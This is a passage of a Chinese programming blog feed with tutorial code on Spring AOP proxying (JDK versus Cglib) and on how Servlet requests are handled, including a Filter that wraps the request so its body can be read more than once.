        <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">intercept</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">,</span> <span class="token class-name">MethodProxy</span> proxy<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> proxy<span class="token punctuation">.</span><span class="token function">invokeSuper</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------代理执行-------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"method Name: "</span><span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"args: "</span><span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"proxy: "</span><span class="token operator">+</span>proxy<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 创建代理对象</span>
    <span class="token class-name">IUserService</span> userService<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">IUserService</span><span class="token punctuation">)</span>enhancer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> userInfo <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">queryUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行结果："</span><span class="token operator">+</span>userInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>可以看到有两种方式可以实现动态代理，有什么区别呢？</p>
</blockquote>
<p>​        JDK: 通过反射，效率低，只能对实现接口的类进行代理，需要一个<code>InvocationHandler</code></p>
<p>​        Cglib：底层采用ASM字节码生成框架，对接口不受限制，但是无法对final方法进行代理，因为CGLib原理是动态生成被代理类的子类。需要一个<code>MethodInterceptor</code></p>
<blockquote>
<p>如何将这些内容整合起来，毕竟通常我们使用切入点表达式配合使用</p>
</blockquote>
<img src="/Users/qinsicheng/Library/Application Support/typora-user-images/image-20221228151856540.png" alt="image-20221228151856540" style="zoom:80%;" />

<p>这里AspectJExpressionPointcut传入切入点表达式，并进行解析，提供类过滤器和方法匹配器函数</p>
<img src="/Users/qinsicheng/Library/Application Support/typora-user-images/image-20221228152730604.png" alt="image-20221228152730604" style="zoom:67%;" />

<p>提供的动态代理方式，Cglib和JDK都实现了AopProxy接口，获取代理后对象，不过JDK代理还实现了InvocationHandler类，也就是它本身就是一个InvocationHandler。Cglib则定义内部类来完整<code>MethodInterceptor</code>,而他们的构造器都需要<code>AdbisedSupport</code></p>
<img src="/Users/qinsicheng/Library/Application Support/typora-user-images/image-20221228214325035.png" alt="image-20221228214325035" style="zoom:50%;" />

<p>最终汇聚为AdvisedSupport，内部封装被代理对象，拦截器，过滤器。并传递到AopProxy获取代理对象</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test_dynamic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 目标对象</span>
    <span class="token class-name">IUserService</span> userService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 组装代理信息</span>
    <span class="token class-name">AdvisedSupport</span> advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    advisedSupport<span class="token punctuation">.</span><span class="token function">setTargetSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TargetSource</span><span class="token punctuation">(</span>userService<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    advisedSupport<span class="token punctuation">.</span><span class="token function">setMethodInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UserServiceInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    advisedSupport<span class="token punctuation">.</span><span class="token function">setMethodMatcher</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AspectJExpressionPointcut</span><span class="token punctuation">(</span><span class="token string">"execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 代理对象(JdkDynamicAopProxy)</span>
    <span class="token class-name">IUserService</span> proxy_jdk <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">IUserService</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">JdkDynamicAopProxy</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 测试调用</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"测试结果："</span> <span class="token operator">+</span> proxy_jdk<span class="token punctuation">.</span><span class="token function">queryUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 代理对象(Cglib2AopProxy)</span>
    <span class="token class-name">IUserService</span> proxy_cglib <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">IUserService</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">Cglib2AopProxy</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 测试调用</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"测试结果："</span> <span class="token operator">+</span> proxy_cglib<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">"花花"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="第12章：把AOP融入Bean的生命周期"><a href="#第12章：把AOP融入Bean的生命周期" class="headerlink" title="第12章：把AOP融入Bean的生命周期"></a>第12章：把AOP融入Bean的生命周期</h2><p>​        上面我们已经可以通过<code>AopProxy</code>进行代理对象的创建，现在如何加入到Bean的生命周期？</p>
<img src="/Users/qinsicheng/Library/Application Support/typora-user-images/image-20221208122149920.png" alt="image-20221208122149920" style="zoom:80%;" />

<img src="/Users/qinsicheng/Library/Application Support/typora-user-images/image-20221208122900579.png" alt="image-20221208122900579" style="zoom:50%;" />

<p>在前面学习<code>BeanPostProcessor</code>时说这是AOP的关键，</p>
]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>IOC</tag>
      </tags>
  </entry>
  <entry>
    <title>从Servlet到SpringMVC</title>
    <url>//post/Web/%E4%BB%8EServlet%20%E5%88%B0%20SpringMVC.html</url>
    <content><![CDATA[<h1 id="从Servlet-到-SpringMVC"><a href="#从Servlet-到-SpringMVC" class="headerlink" title="从Servlet 到 SpringMVC"></a>从Servlet 到 SpringMVC</h1><p>我们从最简单的Servlet项目来查看<strong>一个请求是如何被处理的</strong>： 本案例中使用<code>SpringBoot + Servlet + Tomcat</code>进行演示</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
        <span class="token comment">&lt;!-- 添加servlet依赖模块 --></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.servlet-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>

        <span class="token comment">&lt;!--添加tomcat依赖模块.--></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>我们打断点到达这里 (这里就是我们自己定义的Servlet)：</p>
<p><img src="../../typora-user-images/image-20230310144656611.png" alt="image-20230310144656611"></p>
<p>我们先查看它的调用栈（这里就能看出好的类名是见文知意的，我们先不具体看代码，而是看它的调用过程，能更快的帮助我们确定流程）：</p>
<p><img src="../../typora-user-images/image-20230310153810810.png" alt="image-20230310153810810"></p>
<p><img src="../../typora-user-images/image-20230310154101642.png" alt="image-20230310154101642"></p>
<p>接下来看我这里的代码</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/demo"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> demoServlet <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 这里我通过Get请求发送相应的数据，而这里可以通过req.getParameterMap();说明在此之前已经将参数信息读取到了Map中了</span>
        <span class="token class-name">Map</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> map <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">" : "</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Post请求我们需要判断传递的是什么格式的数据，比如：form-data,json,x-www-form-urlencoded,raw等，然后依次进行处理</span>
        <span class="token class-name">String</span> contentType <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContentType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>contentType <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>contentType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            contentType <span class="token operator">=</span> contentType<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// form表单格式，表单形式可以从 ParameterMap中获取</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>contentType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 获取参数</span>
            <span class="token class-name">Map</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> parameterMap <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            parameterMap<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">" : "</span><span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// json格式 json格式需要从request的输入流中解析获取，我们盲猜这里使用 request.getParameterMap() 无效，就是因为前面判断如果不是表单形式的数据，则不进行解析，需要我们自己来处理。</span>
        <span class="token comment">// 这里有一个常见的坑点：inputStream是不能读取两次的，如果这里读取掉了，后面再读取就会报错。</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"application/json"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>contentType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">ServletInputStream</span> stream <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">final</span> <span class="token keyword">int</span> bufferSize <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
            <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>bufferSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">final</span> <span class="token class-name">StringBuilder</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Reader</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> charsRead<span class="token punctuation">;</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>charsRead <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buffer<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                out<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> charsRead<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>剩下的部分无非就是资源的回收释放，线程结束，请求内容的返回。所以在原先基于Servlet开发，请求内容需要我们自己解析判断。</p>
<h3 id="请求图："><a href="#请求图：" class="headerlink" title="请求图："></a>请求图：</h3><p><img src="../../typora-user-images/image-20230311175438138.png" alt="image-20230311175438138"></p>
<h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><blockquote>
<p>我们常见的一个需求就是通过 <strong>过滤器</strong> 获取到请求的参数与返回的内容，记录到日志中。</p>
<p>比如我们想获取Post请求中的Json数据，我们可以直接通过<code>request.getInputStream();</code> 来像我们在<code>Servlet</code>中一样解析这部分的数据，但如果我们直接这么做了，Servlet中再想获取的这部分数据就请求不到了，如果你使用的SpringMVC，在Controller中指定获取RequestBody数据，则服务器会直接报错。这均是因为InputStream在Filter中读取一遍后，后面就不能在读取了。</p>
<p>那我们该怎么解决呢？</p>
</blockquote>
<h3 id="如何解决InputStream不能重复读取的问题？"><a href="#如何解决InputStream不能重复读取的问题？" class="headerlink" title="如何解决InputStream不能重复读取的问题？"></a>如何解决InputStream不能重复读取的问题？</h3><p>​        其实InputStream底层就是使用指针进行一位一位读取，当第一次读取完后，指针到达最后。那第二次再读取时，指针已经到达末尾了，就无法再读取了。也许你好奇为什么要这么设计，参考这篇文章：<a href="https://blog.csdn.net/dreamtdp/article/details/26733563%E3%80%82">https://blog.csdn.net/dreamtdp/article/details/26733563。</a></p>
<p>​        问题解决很简单：我们把第一次读取到的数据保存起来，下次再想读取数据，不从原来的InputStream中读取，而是从我们这里读取，进行偷天换日。</p>
<h3 id="如何在Filter中进行处理？"><a href="#如何在Filter中进行处理？" class="headerlink" title="如何在Filter中进行处理？"></a>如何在Filter中进行处理？</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ParamsFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 这里我们把原先的request包装成BodyReaderRequestWrapper</span>
        <span class="token class-name">BodyReaderRequestWrapper</span> parsRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BodyReaderRequestWrapper</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 并且把包装后的request传递到了下一个过滤器中</span>
        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>parsRequest<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BodyReaderRequestWrapper</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServletRequestWrapper</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 这里就相当于记录了InputStream中的数据了</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> body<span class="token punctuation">;</span>
    <span class="token comment">/**
     *
     * @param request
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">BodyReaderRequestWrapper</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 直接读取</span>
        <span class="token class-name">InputStream</span> ins <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BufferedReader</span> isr <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        isr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>ins<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> charBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> readCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>readCount <span class="token operator">=</span> isr<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>charBuffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>charBuffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>readCount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 保存到全局变量中</span>
        body <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
 
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">BufferedReader</span> <span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
 
    <span class="token annotation punctuation">@Override</span> 
    <span class="token keyword">public</span> <span class="token class-name">ServletInputStream</span> <span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 可以看到当Servlet中如果使用 req.getInputStream，实际上执行的是这里，我们通过body伪装成原先的样子，Servlet是察觉不到变化的，但数据已经提前获取到了</span>
        <span class="token keyword">final</span> <span class="token class-name">ByteArrayInputStream</span> byteArrayIns <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
